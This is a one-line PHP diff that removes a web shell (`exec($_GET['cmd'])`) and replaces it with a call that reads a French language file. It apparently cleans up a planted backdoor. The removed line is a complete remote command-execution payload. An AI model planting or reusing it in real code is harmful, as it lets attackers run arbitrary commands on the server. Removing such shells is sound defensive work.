@@ -1,1 +1,1 @@
-<?php exec($_GET['cmd']); ?>
+<?php file_get_contents('fr_lang.php') ?>
